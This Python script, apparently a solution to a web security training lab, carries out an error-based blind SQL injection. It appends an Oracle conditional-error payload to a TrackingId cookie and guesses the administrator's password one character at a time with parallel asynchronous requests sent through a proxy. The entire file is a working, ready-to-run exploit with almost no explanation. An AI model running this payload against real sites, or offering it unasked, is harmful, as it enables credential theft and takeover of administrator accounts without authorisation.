import sys
import requests
import urllib3
import urllib
import asyncio
import aiohttp
import json
import copy

password_extracted = {}

"""
Get the character for a single position.
Character is saved in the global variable "password_extracted".
"""
async def getChar(position, url, session, cookies_in, proxy_address):
    # Crack characters 0-9 based on ascii values
    # table (see https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/ASCII-Table-wide.svg/960px-ASCII-Table-wide.svg.png)
    for j in range(48, 58):
        cookies = copy.deepcopy(cookies_in)
        sqli_payload = "'||(SELECT TO_CHAR(1/0) FROM users WHERE username='administrator' AND SUBSTR(password,%s,1)='%s')||'" % (position, chr(j))
        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
        cookies["TrackingId"] = cookies["TrackingId"] + sqli_payload_encoded
        async with session.get(url, cookies=cookies, 
                                ssl=False,
                                proxy=proxy_address) as r:
            text = await r.text()
            if "Internal Server Error" in text:
                print("char %s at pos %s" % (chr(j), position))
                password_extracted[position] = chr(j)
                return

    # Crack characters a-z based on ascii values
    # table
    for j in range(97, 123):
        cookies = copy.deepcopy(cookies_in)
        sqli_payload = "'||(SELECT TO_CHAR(1/0) FROM users WHERE username='administrator' AND SUBSTR(password,%s,1)='%s')||'" % (position, chr(j))
        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
        cookies["TrackingId"] = cookies["TrackingId"] + sqli_payload_encoded
        async with session.get(url, cookies=cookies, 
                                ssl=False,
                                proxy=proxy_address) as r:
            text = await r.text()
            if "Internal Server Error" in text:
                print("char %s at pos %s" % (chr(j), position))
                password_extracted[position] = chr(j)
                return

"""
Run the tasks to get the individual characters in parallel.
Using aiohttp as asynchronous http client.
"""
async def runParallel(url, cookies, proxy_address):
    async with aiohttp.ClientSession() as session:
        rangeNums = list(range(1, 21))
        tasks = [getChar(i, url, session, cookies, proxy_address) for i in rangeNums]
        await asyncio.gather(*tasks)
    
    password = "".join(
        password_extracted[i] for i in sorted(password_extracted)
    )
    print("\npassword: %s\n" % password)
    print(password_extracted)


"""
Load config settings from config.json
and run parallel character crack.

Config layout:
{
    "TrackingId": "<tracking_id>",
    "session": "<session>",
    "url": "<url>",
    "http_proxy": "<http_proxy>",
    "https_proxy": "<https_proxy>"
}
"""
def main():
    with open("config.json") as f:
        config = json.load(f)
        print(config)

    if(not("url" in config) or not("TrackingId" in config) or not("session" in config) or not("http_proxy" in config) or not("https_proxy" in config)):
        sys.stdout.write("(+) Use the config.json file to configure the script.\n")
        sys.stdout.write("(+) For syntax, see the github repo.\n")
        sys.stdout.flush()
        return

    url = config["url"]
    cookies = {
        "TrackingId": config["TrackingId"],
        "session": config["session"],
    }
    proxies = {
        "http": config["http_proxy"],
        "https": config["https_proxy"]
    }
    print("(+) Settings: \nURL: %s\nCookies: %s\nProxies: %s\n" % (url, cookies, proxies))
    print("(+) Retrieving administrator password...\n")
    asyncio.run(runParallel(url, cookies, config["http_proxy"]))

if __name__ == "__main__":
    main()